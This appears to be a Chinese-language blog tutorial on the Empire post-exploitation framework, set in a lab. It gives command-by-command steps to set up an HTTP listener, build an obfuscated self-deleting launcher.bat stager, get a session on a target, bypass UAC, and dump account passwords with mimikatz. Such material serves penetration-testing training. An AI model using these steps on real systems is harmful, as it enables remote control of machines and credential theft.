## empire的基础操作

### 1\. 建立监听器

help 查看帮助命令

[![wps1](https://image.3001.net/images/20201116/1605509204.jpg!small)](https://img2020.cnblogs.com/blog/2209303/202011/2209303-20201114150440924-1812269094.jpg)

listeners 查看监听器

[![wps2](https://image.3001.net/images/20201116/1605509205.jpg!small)](https://img2020.cnblogs.com/blog/2209303/202011/2209303-20201114150441754-1983564402.jpg)

uselistener xxx 使用监听器模块

常用的监听模块：http

按两次tab键查看能使用的监听器模块

[![wps3](https://image.3001.net/images/20201116/1605509206.jpg!small)](https://img2020.cnblogs.com/blog/2209303/202011/2209303-20201114150442512-118649567.jpg)

  

info 查看参数信息

[![wps5](https://image.3001.net/images/20201116/1605509206.jpg!small)](https://img2020.cnblogs.com/blog/2209303/202011/2209303-20201114150443766-1412654153.jpg)

设置参数

set Name xxx

[![wps6](https://image.3001.net/images/20201116/1605509207.jpg!small)](https://img2020.cnblogs.com/blog/2209303/202011/2209303-20201114150444384-396103789.jpg)

set Host http://xxx

[![wps7](https://image.3001.net/images/20201116/1605509207.jpg!small)](https://img2020.cnblogs.com/blog/2209303/202011/2209303-20201114150444968-767490172.jpg)

set Port xxx

[![wps8](https://image.3001.net/images/20201116/1605509208.jpg!small)](https://img2020.cnblogs.com/blog/2209303/202011/2209303-20201114150445504-1830520019.jpg)

[![wps9](https://image.3001.net/images/20201116/1605509208.jpg!small)](https://img2020.cnblogs.com/blog/2209303/202011/2209303-20201114150446062-537775406.jpg)

执行：execute

[![wps10](https://image.3001.net/images/20201116/1605509209.jpg!small)](https://img2020.cnblogs.com/blog/2209303/202011/2209303-20201114150446709-1479824133.jpg)

main 返回主菜单

这边显示目前有一个活跃的监听器

[![wps11](https://image.3001.net/images/20201116/1605509210.jpg!small)](https://img2020.cnblogs.com/blog/2209303/202011/2209303-20201114150447286-48364354.jpg)

  

### 2\. 设置stagers

usestagers xxx 使用stager模块

常用的模块：windows/hta、windows/launcher_bat

按两次tab键查看能使用的stager模块

[![wps12](https://image.3001.net/images/20201116/1605509211.jpg!small)](https://img2020.cnblogs.com/blog/2209303/202011/2209303-20201114150447901-1320587710.jpg)

  

info 查看要设置的参数

[![wps14](https://image.3001.net/images/20201116/1605509211.jpg!small)](https://img2020.cnblogs.com/blog/2209303/202011/2209303-20201114150449089-1661757053.jpg)

set Listener xx 设置监听器

[![wps15](https://image.3001.net/images/20201116/1605509212.jpg!small)](https://img2020.cnblogs.com/blog/2209303/202011/2209303-20201114150450388-1824236135.jpg)

set OutFile /var/www/html/launcher.bat 设置文件生成路劲

[![wps16](https://image.3001.net/images/20201116/1605509212.jpg!small)](https://img2020.cnblogs.com/blog/2209303/202011/2209303-20201114150451265-570509062.jpg)

delete 木马运行完是否自动删除

Obfuscate（混淆）

[![wps17](https://image.3001.net/images/20201116/1605509213.jpg!small)](https://img2020.cnblogs.com/blog/2209303/202011/2209303-20201114150452248-236318826.jpg)

execute 执行

[![wps18](https://image.3001.net/images/20201116/1605509213.jpg!small)](https://img2020.cnblogs.com/blog/2209303/202011/2209303-20201114150453178-341828489.jpg)

在靶机上双击bat文件成功反弹会话

[![wps19](https://image.3001.net/images/20201116/1605509214.jpg!small)](https://img2020.cnblogs.com/blog/2209303/202011/2209303-20201114150453736-1294145292.jpg)

  

### 3\. 用户交互

agents 切换到用户列表

[![wps20](https://image.3001.net/images/20201116/1605509214.jpg!small)](https://img2020.cnblogs.com/blog/2209303/202011/2209303-20201114150454394-1300421046.jpg)

list 列出用户

[![wps21](https://image.3001.net/images/20201116/1605509215.jpg!small)](https://img2020.cnblogs.com/blog/2209303/202011/2209303-20201114150455052-736117684.jpg)

rename 修改用户ID的名字

[![wps22](https://image.3001.net/images/20201116/1605509215.jpg!small)](https://img2020.cnblogs.com/blog/2209303/202011/2209303-20201114150455687-976425205.jpg)

interact 进入到用户交互界面

[![wps23](https://image.3001.net/images/20201116/1605509216.jpg!small)](https://img2020.cnblogs.com/blog/2209303/202011/2209303-20201114150456312-926797581.jpg)

sysinfo 查看系统信息

[![wps24](https://image.3001.net/images/20201116/1605509216.jpg!small)](https://img2020.cnblogs.com/blog/2209303/202011/2209303-20201114150456908-104216116.jpg)

sc 截屏

[![wps25](https://image.3001.net/images/20201116/1605509217.jpg!small)](https://img2020.cnblogs.com/blog/2209303/202011/2209303-20201114150457539-616553253.jpg)

[![wps26](https://image.3001.net/images/20201116/1605509217.jpg!small)](https://img2020.cnblogs.com/blog/2209303/202011/2209303-20201114150458149-1633908505.jpg)

searchmodule 搜索模块

[![wps27](https://image.3001.net/images/20201116/1605509218.jpg!small)](https://img2020.cnblogs.com/blog/2209303/202011/2209303-20201114150458712-978669188.jpg)

shell + command 执行命令

[![wps28](https://image.3001.net/images/20201116/1605509219.jpg!small)](https://img2020.cnblogs.com/blog/2209303/202011/2209303-20201114150459400-1984712186.jpg)

spawn 迁移到新的用户需要指定监听器的名字

[![wps29](https://image.3001.net/images/20201116/1605509219.jpg!small)](https://img2020.cnblogs.com/blog/2209303/202011/2209303-20201114150500053-1792824474.jpg)

[![wps30](https://image.3001.net/images/20201116/1605509220.jpg!small)](https://img2020.cnblogs.com/blog/2209303/202011/2209303-20201114150500636-844611320.jpg)

产生了一个新的会话

[![wps31](https://image.3001.net/images/20201116/1605509220.jpg!small)](https://img2020.cnblogs.com/blog/2209303/202011/2209303-20201114150501352-1643654298.jpg)

用户清除:

kill agents | all

[![wps32](https://image.3001.net/images/20201116/1605509221.jpg!small)](https://img2020.cnblogs.com/blog/2209303/202011/2209303-20201114150501997-1664629847.jpg)

监听器清除：

kill listener | all

[![wps33](https://image.3001.net/images/20201116/1605509221.jpg!small)](https://img2020.cnblogs.com/blog/2209303/202011/2209303-20201114150502809-530877085.jpg)

  

### 4\. 提权

#### 绕过uac

bypassuac <listener> bypassuac绕过uac提权

[![wps34](https://image.3001.net/images/20201116/1605509222.jpg!small)](https://img2020.cnblogs.com/blog/2209303/202011/2209303-20201114150503418-1196601525.jpg)

可以看到产生了一个带*的会话，提权成功用户名前面会多一个*号

  

mimikatz 在拥有权限后可以利用mimikatz获取用户账号密码

[![wps36](https://image.3001.net/images/20201116/1605509223.jpg!small)](https://img2020.cnblogs.com/blog/2209303/202011/2209303-20201114150504739-508053520.jpg)

creds 以列表的形式显示mimikatz获取的账号密码

  

#### uac提权（需要手动确认）

searchmodule ask 搜索ask模块

[![wps38](https://image.3001.net/images/20201116/1605509224.jpg!small)](https://img2020.cnblogs.com/blog/2209303/202011/2209303-20201114150506066-1937740009.jpg)

usemodule privesc/ask 使用privesc/ask模块

[有些图片丢失详情可以看我的博客园](https://www.cnblogs.com/caihon/p/13973293.html)

info 查看所需参数

[![wps40](https://image.3001.net/images/20201116/1605509224.jpg!small)](https://img2020.cnblogs.com/blog/2209303/202011/2209303-20201114150507372-1100372267.jpg)

设置监听器

[![wps41](https://image.3001.net/images/20201116/1605509225.jpg!small)](https://img2020.cnblogs.com/blog/2209303/202011/2209303-20201114150507906-363650197.jpg)

run 执行

[![wps42](https://image.3001.net/images/20201116/1605509226.jpg!small)](https://img2020.cnblogs.com/blog/2209303/202011/2209303-20201114150508661-1199356408.jpg)

靶机弹出uac认证框

  

列表中产生新的管理员会话

[![wps44](https://image.3001.net/images/20201116/1605509227.jpg!small)](https://img2020.cnblogs.com/blog/2209303/202011/2209303-20201114150510043-1547044430.jpg)

